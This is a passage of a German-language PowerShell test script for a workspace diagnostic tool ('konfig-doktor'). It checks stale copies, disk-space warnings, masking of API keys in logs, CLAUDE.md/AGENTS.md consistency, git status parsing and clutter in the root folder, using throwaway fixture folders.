Pruefe 'Zeitbudget erschoepft: kein git-Aufruf, UNKLAR' ((($r | Where-Object { $_.id -eq 'GIT-ZWEIGE-NICHT-LESBAR' }).titel -match 'Zeitbudget') -and (($r | Where-Object { $_.id -eq 'GIT-STATUS-NICHT-LESBAR' }).titel -match 'Zeitbudget') -and ((Schwere-Von $r 'GIT-STATUS-NICHT-LESBAR') -eq 'UNKLAR'))
$gz = @(Get-Content -LiteralPath $Doktor | Where-Object { $_ -match '-Datei \$git ' })
Pruefe 'alle git-Aufrufe mit --no-optional-locks zuerst' (($gz.Count -ge 2) -and (@($gz | Where-Object { $_ -notmatch "-Argumente @\('--no-optional-locks'," }).Count -eq 0)) "Zeilen=$($gz.Count)"

Write-Host '--- Modul ballast ---'
$fx = Neue-Wurzel
Schreibe (Join-Path $fx 'Agenten/Hermes/config.yaml') 'a'
Schreibe (Join-Path $fx 'Agenten/Hermes/config.yaml.txt') 'a'
Schreibe (Join-Path $fx 'Agenten/Hermes/config.yaml.bak-20260101') 'a'
Schreibe (Join-Path $fx 'Agenten/Hermes/auth.json.corrupt') 'a'
Schreibe (Join-Path $fx 'Agenten/Hermes/notiz.vor-umbau') 'a'
Schreibe (Join-Path $fx 'Agenten/Routinen/sichern-aussenhaus.ps1') 'a'
Schreibe (Join-Path $fx 'Agenten/Routinen/sichern-ausser-haus.ps1') 'a'
Schreibe (Join-Path $fx 'Agenten/Routinen/a.ps1') 'a'
Schreibe (Join-Path $fx 'Agenten/Routinen/b.ps1') 'a'
Schreibe (Join-Path $fx 'Agenten/Werkstatt/rest.txt') 'a'
$r = Lauf $fx @('ballast')
$ak = $r | Where-Object { $_.id -eq 'BALLAST-ALTKOPIEN' }
Pruefe 'Altkopien gefunden (bak, corrupt, vor-)' (($null -ne $ak) -and ($ak.beleg -match 'config\.yaml\.bak-20260101') -and ($ak.beleg -match 'auth\.json\.corrupt') -and ($ak.beleg -match 'notiz\.vor-umbau'))
Pruefe 'normale Datei ist keine Altkopie' (($null -ne $ak) -and ($ak.beleg -notmatch 'config\.yaml(?!\.)'))
$dn = $r | Where-Object { $_.id -eq 'BALLAST-DOPPELNAMEN' }
Pruefe 'aehnliche Skriptnamen gemeldet' (($null -ne $dn) -and ($dn.beleg -match 'sichern-aussenhaus\.ps1') -and ($dn.beleg -match 'sichern-ausser-haus\.ps1'))
Pruefe 'kurze Namen a/b sind kein Doppelname' (($null -ne $dn) -and ($dn.beleg -notmatch '(^|[/ ])[ab]\.ps1'))
Pruefe 'txt-Zwilling einer Config gemeldet' ((Hat $r 'BALLAST-TXT-ZWILLINGE') -and (($r | Where-Object { $_.id -eq 'BALLAST-TXT-ZWILLINGE' }).beleg -match 'config\.yaml\.txt'))
Pruefe 'Zusatzordner Agenten/Werkstatt gemeldet' ((Hat $r 'BALLAST-ZUSATZORDNER') -and (($r | Where-Object { $_.id -eq 'BALLAST-ZUSATZORDNER' }).beleg -match 'Werkstatt'))
Pruefe 'alles nur HINWEIS' (@($r | Where-Object { $_.schwere -ne 'HINWEIS' -and $_.modul -eq 'ballast' }).Count -eq 0)
$fx2 = Neue-Wurzel
$r = Lauf $fx2 @('ballast')
Pruefe 'leere Wurzel: kein Ballast, kein Absturz' (@($r | Where-Object { $_.modul -eq 'ballast' }).Count -eq 0)
$fx3 = Neue-Wurzel
Schreibe (Join-Path $fx3 'Agenten/Routinen/abcdefgh.ps1') 'a'
Schreibe (Join-Path $fx3 'Agenten/Routinen/abcdefxy.ps1') 'a'
Schreibe (Join-Path $fx3 'Agenten/Routinen/mnopqrst.ps1') 'a'
Schreibe (Join-Path $fx3 'Agenten/Routinen/mnopqxyz.ps1') 'a'
Schreibe (Join-Path $fx3 'Agenten/Routinen/werkzeugeins.ps1') 'a'
Schreibe (Join-Path $fx3 'Agenten/Routinen/werkzeugeins.py') 'a'
Schreibe (Join-Path $fx3 'Agenten/Hermes/state.json.orig') 'a'
Schreibe (Join-Path $fx3 'Agenten/Hermes/config.yaml.old') 'a'
Schreibe (Join-Path $fx3 'Agenten/Modelle/x.txt') 'a'
Schreibe (Join-Path $fx3 'Agenten/MaxHirn/x.txt') 'a'
Schreibe (Join-Path $fx3 'Agenten/Agenten/x.txt') 'a'
$r = Lauf $fx3 @('ballast')
$dn = $r | Where-Object { $_.id -eq 'BALLAST-DOPPELNAMEN' }
Pruefe 'Levenshtein 2 wird gemeldet' (($null -ne $dn) -and ($dn.beleg -match 'abcdefgh\.ps1 ~ abcdefxy\.ps1'))
Pruefe 'Levenshtein 3 wird nicht gemeldet' (($null -ne $dn) -and ($dn.beleg -notmatch 'mnopq'))
Pruefe 'gleicher Name, andere Endung (ps1/py) ist kein Doppelname' (($null -ne $dn) -and ($dn.beleg -notmatch 'werkzeugeins'))
Pruefe 'ohne Kappung keine Mindestangabe im Titel' (($null -ne $dn) -and ($dn.titel -notmatch 'mindestens'))
$ak = $r | Where-Object { $_.id -eq 'BALLAST-ALTKOPIEN' }
Pruefe 'Altkopien .orig und .old erkannt' (($null -ne $ak) -and ($ak.beleg -match 'state\.json\.orig') -and ($ak.beleg -match 'config\.yaml\.old'))
Pruefe '.old-Treffer macht Altkopien zur Vermutung' (($null -ne $ak) -and ($ak.status -eq 'Vermutung'))
Pruefe 'bis 12 Altkopien ohne Auslassungszeichen' (($null -ne $ak) -and ($ak.beleg -notmatch '\.\.\.'))
$zo = $r | Where-Object { $_.id -eq 'BALLAST-ZUSATZORDNER' }
Pruefe 'Zusatzordner Modelle, MaxHirn, Agenten gemeldet' (($null -ne $zo) -and ($zo.beleg -match 'Agenten/Modelle') -and ($zo.beleg -match 'Agenten/MaxHirn') -and ($zo.beleg -match 'Agenten/Agenten'))
$fx4 = Neue-Wurzel
for ($k = 10; $k -lt 35; $k++) { Schreibe (Join-Path $fx4 "Agenten/Routinen/sichernpaar$k.ps1") 'a' }
for ($k = 10; $k -lt 23; $k++) { Schreibe (Join-Path $fx4 "Agenten/Hermes/datei$k.json.bak") 'a' }
$r = Lauf $fx4 @('ballast')
$dn = $r | Where-Object { $_.id -eq 'BALLAST-DOPPELNAMEN' }
Pruefe 'Kappung bei 20 Paaren' (($null -ne $dn) -and (@($dn.beleg -split '; ').Count -eq 20))
Pruefe 'Kappung: Titel sagt mindestens 20' (($null -ne $dn) -and ($dn.titel -match '^mindestens 20 '))
$ak = $r | Where-Object { $_.id -eq 'BALLAST-ALTKOPIEN' }
Pruefe 'mehr als 12 Altkopien: Beleg endet mit ...' (($null -ne $ak) -and ($ak.titel -match '^13 ') -and ($ak.beleg -match '; \.\.\.$') -and (@($ak.beleg -split '; ').Count -eq 13))
Pruefe 'nur .bak: Altkopien gesichert' (($null -ne $ak) -and ($ak.status -eq 'gesichert'))

Write-Host '--- Modul laufzeit ---'
$fx = Neue-Wurzel
Schreibe (Join-Path $fx 'Agenten/Routinen/plattenplatz-pruefen.ps1') ("param([switch]`$OhneOrdner)`nWrite-Output 'INFO alles gut'`nWrite-Output 'WARN Commit-Reserve 3 GB unter Schwelle'`nWrite-Output 'WARN Laufwerk G: nur 2 GB frei'`nexit 1`n")
New-Item -ItemType Directory -Path (Join-Path $fx 'Werkstatt') | Out-Null
$ziel = Neue-Wurzel
New-Item -ItemType Junction -Path (Join-Path $fx 'Modelle') -Target $ziel | Out-Null
$r = Lauf $fx @('laufzeit')
Pruefe 'lebende Junction und normaler Ordner: kein Junction-Befund' (-not (Hat $r 'LAUFZEIT-JUNCTION-Modelle') -and -not (Hat $r 'LAUFZEIT-JUNCTION-Werkstatt'))
$pl = @($r | Where-Object { $_.id -like 'LAUFZEIT-PLATZ-[0-9]*' })
Pruefe 'Commit-Reserve unter Schwelle: KRITISCH' (@($pl | Where-Object { $_.schwere -eq 'KRITISCH' -and $_.beleg -match 'Commit' }).Count -eq 1)
Pruefe 'Plattenplatz-Warnung: WARNUNG' (@($pl | Where-Object { $_.schwere -eq 'WARNUNG' -and $_.beleg -match 'Laufwerk G' }).Count -eq 1)
Pruefe 'INFO-Zeilen werden nicht gemeldet' ($pl.Count -eq 2)
Remove-Item -LiteralPath $ziel -Recurse -Force
$r = Lauf $fx @('laufzeit')
Pruefe 'tote Junction: KRITISCH' ((Hat $r 'LAUFZEIT-JUNCTION-Modelle') -and ((Schwere-Von $r 'LAUFZEIT-JUNCTION-Modelle') -eq 'KRITISCH'))
[System.IO.Directory]::Delete((Join-Path $fx 'Modelle'))
Remove-Item -LiteralPath (Join-Path $fx 'Werkstatt') -Force
$r = Lauf $fx @('laufzeit')
Pruefe 'fehlender Ordner: KRITISCH' ((Schwere-Von $r 'LAUFZEIT-JUNCTION-Werkstatt') -eq 'KRITISCH')
Remove-Item -LiteralPath (Join-Path $fx 'Agenten/Routinen/plattenplatz-pruefen.ps1')
$r = Lauf $fx @('laufzeit')
Pruefe 'ohne plattenplatz-pruefen.ps1: UNKLAR' ((Schwere-Von $r 'LAUFZEIT-PLATZ-NICHT-PRUEFBAR') -eq 'UNKLAR')
$ppFx = Join-Path $fx 'Agenten/Routinen/plattenplatz-pruefen.ps1'
function Platz-Fixture([string[]]$Zeilen, [int]$Code) {
    $s = "param([switch]`$OhneOrdner)`n"
    foreach ($z in $Zeilen) { $s += "Write-Output '$z'`n" }
    Schreibe $ppFx ($s + "exit $Code`n")
}
function Platz-Unklar($Befunde) { return ((Schwere-Von $Befunde 'LAUFZEIT-PLATZ-NICHT-PRUEFBAR') -eq 'UNKLAR') }
Platz-Fixture @('INFO Commit: 20 GB frei von 100 GB.') 0
$r = Lauf $fx @('laufzeit') @{ ModulLimitSek = 0 }
Pruefe 'Budget 0: plattenplatz nicht gestartet, UNKLAR Zeitbudget erschoepft' ((Platz-Unklar $r) -and (@($r | Where-Object { $_.id -eq 'LAUFZEIT-PLATZ-NICHT-PRUEFBAR' -and $_.titel -match 'Zeitbudget' }).Count -eq 1))
$r = Lauf $fx @('laufzeit')
Pruefe 'gesunde Ausgabe (Exit 0, Commit-Zeile): kein Platz-Befund' (-not (Hat-Praefix $r 'LAUFZEIT-PLATZ'))
Platz-Fixture @() 3
$r = Lauf $fx @('laufzeit')
Pruefe 'Absturz (Exit 3, leere Ausgabe): UNKLAR mit Exitcode im Beleg' ((Platz-Unklar $r) -and (@($r | Where-Object { $_.id -eq 'LAUFZEIT-PLATZ-NICHT-PRUEFBAR' -and $_.beleg -match 'Exit 3' }).Count -eq 1))
Platz-Fixture @() 0
$r = Lauf $fx @('laufzeit')
Pruefe 'leere Ausgabe mit Exit 0: UNKLAR' (Platz-Unklar $r)
Platz-Fixture @('INFO Laufwerk C: 80 GB frei.', 'INFO Commit: nicht lesbar.') 0
$r = Lauf $fx @('laufzeit')
Pruefe 'INFO Commit: nicht lesbar: UNKLAR' (Platz-Unklar $r)
Platz-Fixture @('INFO Commit: 20 GB frei von 100 GB.') 1
$r = Lauf $fx @('laufzeit')
Pruefe 'Exit 1 ohne WARN-Zeile: UNKLAR' (Platz-Unklar $r)
Platz-Fixture @('WARN Laufwerk C: nur 2 GB frei (Ordner commit-cache).', 'INFO Commit: 20 GB frei von 100 GB.') 1
$r = Lauf $fx @('laufzeit')
Pruefe 'commit nur im Text einer Laufwerkszeile: WARNUNG, nicht KRITISCH' (((Schwere-Von $r 'LAUFZEIT-PLATZ-1') -eq 'WARNUNG') -and -not (Hat $r 'LAUFZEIT-PLATZ-NICHT-PRUEFBAR'))

Write-Host '--- Sammelfix T8 ---'
# Maske: JSON-Form "api_key": "wert" (Beleg von HERMES-LOGFEHLER)
$fx = Neue-Wurzel
$h = Join-Path $fx 'Agenten/Hermes'
Schreibe (Join-Path $h 'config.yaml') 'a: 1'
Schreibe (Join-Path $h 'logs/errors.log') ('ERROR cfg {"api_key": "GEHEIMJSON", "token": "zwei GEHEIMWORT"}' + "`n")
$r = Lauf $fx @('hermes')
$lf = @($r | Where-Object { $_.id -eq 'HERMES-LOGFEHLER' }) | Select-Object -First 1
Pruefe 'Maske: JSON-Form "api_key": "wert" maskiert' (($null -ne $lf) -and ($lf.beleg -notmatch 'GEHEIMJSON') -and ($lf.beleg -notmatch 'GEHEIMWORT') -and ($lf.beleg -match '"api_key": \*\*\*')) "beleg=$($lf.beleg)"
# auth.json mit Infinity/NaN/Riesenzahl: kein Modulabsturz
Schreibe (Join-Path $h 'auth.json') '{"a":{"expires_at":"Infinity"},"b":{"expires_at":"NaN"},"c":{"expires_at":1e300},"d":{"expires_at":"2020-01-01T00:00:00Z"}}'
$r = Lauf $fx @('hermes')
$ul = @($r | Where-Object { $_.id -eq 'HERMES-AUTH-ABLAUF-UNLESBAR' }) | Select-Object -First 1
Pruefe 'auth.json Infinity/NaN: kein PRUEFUNG-FEHLGESCHLAGEN' (-not (Hat $r 'PRUEFUNG-FEHLGESCHLAGEN-hermes')) "ids=$(($r | ForEach-Object { $_.id }) -join ',')"
Pruefe 'auth.json Infinity/NaN: UNKLAR/Vermutung mit 3 Pfaden' (($null -ne $ul) -and ($ul.schwere -eq 'UNKLAR') -and ($ul.status -eq 'Vermutung') -and ($ul.titel -match '^3 ') -and ($ul.beleg -match '/a/expires_at'))
Pruefe 'auth.json Infinity/NaN: gueltiger Ablauf wird trotzdem gemeldet' (Hat $r 'HERMES-AUTH-ABGELAUFEN')

# regelpaare: Ordner statt Datei, CLAUDE.md fehlt, einzelnes CR, betroffene Datei, Schluss-Newline
$fx = Neue-Wurzel
$inh = "Zeile eins`nZeile zwei`n"
New-Item -ItemType Directory -Path (Join-Path $fx 'CLAUDE.md') -Force | Out-Null
Schreibe (Join-Path $fx 'AGENTS.md') $inh
Schreibe (Join-Path $fx 'MaxHirn/CLAUDE.md') ($inh -replace "`n", "`r")
Schreibe (Join-Path $fx 'MaxHirn/AGENTS.md') $inh
Schreibe (Join-Path $fx 'Werkstatt/CLAUDE.md') $inh
Schreibe (Join-Path $fx 'Werkstatt/AGENTS.md') "Zeile eins`nZeile zwei"
$r = Lauf $fx @('regelpaare')
Pruefe 'Ordner namens CLAUDE.md: CLAUDE.md fehlt (WARNUNG), kein Absturz' ((-not (Hat $r 'PRUEFUNG-FEHLGESCHLAGEN-regelpaare')) -and ((Schwere-Von $r 'REGELPAAR-FEHLT-Wurzel') -eq 'WARNUNG') -and (($r | Where-Object { $_.id -eq 'REGELPAAR-FEHLT-Wurzel' }).titel -match 'CLAUDE\.md fehlt'))
$ze = @($r | Where-Object { $_.id -eq 'REGELPAAR-ZEILENENDE-MaxHirn' }) | Select-Object -First 1
Pruefe 'einzelnes CR: ZEILENENDE-HINWEIS statt INHALT' (($null -ne $ze) -and ($ze.schwere -eq 'HINWEIS') -and -not (Hat $r 'REGELPAAR-INHALT-MaxHirn'))
Pruefe 'ZEILENENDE-Vorschlag nennt die betroffene Datei (CLAUDE.md)' (($null -ne $ze) -and ($ze.vorschlag -match 'abweichend: CLAUDE\.md') -and ($ze.vorschlag -notmatch 'AGENTS\.md'))
$wi = @($r | Where-Object { $_.id -eq 'REGELPAAR-INHALT-Werkstatt' }) | Select-Object -First 1
Pruefe 'nur Schluss-Newline verschieden: WARNUNG Zeile 3' (($null -ne $wi) -and ($wi.schwere -eq 'WARNUNG') -and ($wi.beleg -match 'Zeile 3'))
Remove-Item -LiteralPath (Join-Path $fx 'CLAUDE.md') -Force
$r = Lauf $fx @('regelpaare')
Pruefe 'CLAUDE.md fehlt (Datei): WARNUNG mit Dateinamen' (((Schwere-Von $r 'REGELPAAR-FEHLT-Wurzel') -eq 'WARNUNG') -and (($r | Where-Object { $_.id -eq 'REGELPAAR-FEHLT-Wurzel' }).titel -match 'CLAUDE\.md fehlt'))

# git-regeln: porcelain -z, Umbenennung mit Sonderzeichen
$fx = Neue-Wurzel
git -C $fx init -q *> $null
git -C $fx symbolic-ref HEAD refs/heads/master *> $null
Schreibe (Join-Path $fx 'alt name.txt') 'a'
git -C $fx add 'alt name.txt' *> $null
git -C $fx -c user.name=t -c user.email=t@t -c commit.gpgsign=false commit -q -m init *> $null
$sonder = "neu ; name 'q' #1.txt"
git -C $fx mv 'alt name.txt' $sonder *> $null
(Get-Item -LiteralPath (Join-Path $fx $sonder)).LastWriteTime = (Get-Date).AddDays(-8)
$r = Lauf $fx @('git-regeln')
$ru = @($r | Where-Object { $_.id -eq 'GIT-RUHEND' }) | Select-Object -First 1
Pruefe 'porcelain -z: Umbenennung zaehlt einmal, Zielname im Beleg' (($null -ne $ru) -and ($ru.titel -match '\(1 insgesamt geaendert\)') -and ($ru.beleg -match [regex]::Escape($sonder)) -and ($ru.beleg -notmatch 'alt name')) "titel=$($ru.titel) beleg=$($ru.beleg)"
$gs = @(Get-Content -LiteralPath $Doktor | Where-Object { $_ -match "'status', '--porcelain'" })
Pruefe 'git status wird mit -z gelesen' (($gs.Count -eq 1) -and ($gs[0] -match "'--porcelain', '-z'"))

# ballast: Titel ohne 'davon 0 unsicher' bei reinen .bak-Treffern
$r = Lauf $fx4 @('ballast')
$ak = @($r | Where-Object { $_.id -eq 'BALLAST-ALTKOPIEN' }) | Select-Object -First 1
Pruefe 'nur .bak: Titel ohne "unsicher"' (($null -ne $ak) -and ($ak.titel -notmatch 'unsicher')) "titel=$($ak.titel)"
$r = Lauf $fx3 @('ballast')
$ak = @($r | Where-Object { $_.id -eq 'BALLAST-ALTKOPIEN' }) | Select-Object -First 1
Pruefe 'mit .old: Titel nennt "davon 1 unsicher"' (($null -ne $ak) -and ($ak.titel -match 'davon 1 unsicher')) "titel=$($ak.titel)"

Write-Host '--- Modul wurzel ---'
$fx = Neue-Wurzel
foreach ($d in 'MaxHirn', 'Agenten', 'Werkstatt', '.git', '.claude', '.githooks', '.worktrees') { New-Item -ItemType Directory -Path (Join-Path $fx $d) | Out-Null }
foreach ($f in 'AGENTS.md', 'CLAUDE.md', 'README.md', '.gitignore', 'omnitrade.cmd') { Schreibe (Join-Path $fx $f) 'x' }
$r = Lauf $fx @('wurzel')
Pruefe 'saubere Wurzel: kein Befund' (@($r | Where-Object { $_.modul -eq 'wurzel' }).Count -eq 0) (($r | ForEach-Object { $_.id }) -join ',')
Schreibe (Join-Path $fx 'docs/superpowers/plans/p.md') 'x'
Schreibe (Join-Path $fx 'package.json') '{}'
New-Item -ItemType Directory -Path (Join-Path $fx '.venv') | Out-Null
Schreibe (Join-Path $fx 'test-prv-key.pem') 'x'
Schreibe (Join-Path $fx '.env') 'X=1'
Schreibe (Join-Path $fx 'docker-compose.yml') 'x'
Schreibe (Join-Path $fx 'CLAUDE.md.bak-20261001') 'x'
Schreibe (Join-Path $fx 'IMPROVEMENTS.md') 'x'
$r = Lauf $fx @('wurzel')
$w = @($r | Where-Object { $_.id -eq 'WURZEL-ABLAGEFEHLER' }) | Select-Object -First 1
Pruefe 'Ablagefehler als WARNUNG' (($null -ne $w) -and ($w.schwere -eq 'WARNUNG') -and ($w.titel -match '^7 Ablagefehler')) "titel=$($w.titel)"
Pruefe 'Beleg nennt docs, .venv, .pem, .env, compose, .bak' (($w.beleg -match 'docs \(Ordner') -and ($w.beleg -match '\.venv') -and ($w.beleg -match 'test-prv-key\.pem') -and ($w.beleg -match '\.env \(') -and ($w.beleg -match 'docker-compose') -and ($w.beleg -match 'CLAUDE\.md\.bak'))
$h = @($r | Where-Object { $_.id -eq 'WURZEL-UNBEKANNT' }) | Select-Object -First 1
Pruefe 'Unbekanntes als HINWEIS' (($null -ne $h) -and ($h.schwere -eq 'HINWEIS') -and ($h.beleg -match 'IMPROVEMENTS\.md') -and ($h.beleg -notmatch 'docs'))
Pruefe 'Erlaubtes wird nicht gemeldet' ((($w.beleg + $h.beleg) -notmatch 'omnitrade\.cmd|\.claude|\.githooks|README|AGENTS\.md \('))

Write-Host '--- echte Wurzel (Gegenprobe) ---'
$echteWurzel = Split-Path ((& git -C $PSScriptRoot rev-parse --path-format=absolute --git-common-dir) -replace "[\/]$", "") -Parent
$vorher = (& git -C $echteWurzel status --porcelain 2>$null) -join "`n"
$sw = [System.Diagnostics.Stopwatch]::StartNew()
$k = Lauf-Kind @('-Kurz')
$sw.Stop()
$nachher = (& git -C $echteWurzel status --porcelain 2>$null) -join "`n"
Pruefe 'echter Lauf endet mit Exit 0 oder 1 (nicht 2)' (($k.Exit -eq 0) -or ($k.Exit -eq 1)) "Exit=$($k.Exit) $($k.Out)"
Pruefe 'echter Lauf liefert die Zaehlzeile' ($k.Out -match 'konfig-doktor: KRITISCH \d+ \| WARNUNG \d+ \| HINWEIS \d+ \| UNKLAR \d+')
Pruefe 'echter Lauf dauert unter 60 s' ($sw.Elapsed.TotalSeconds -lt 60) ("{0:N1} s" -f $sw.Elapsed.TotalSeconds)
Pruefe 'git status vorher = nachher (nichts veraendert)' ($vorher -ceq $nachher) '(andere Sitzungen koennen waehrenddessen schreiben: Test wiederholen)'

# === ENDE (neue Testabschnitte oberhalb dieser Zeile einfuegen) ===
foreach ($p in $script:Aufraeumen) { Remove-Item -LiteralPath $p -Recurse -Force -ErrorAction SilentlyContinue }
if ($script:Fehler -gt 0) { Write-Host "konfig-doktor FEHLGESCHLAGEN: $($script:Fehler) Pruefung(en)"; exit 1 }
Write-Host 'konfig-doktor bestanden'
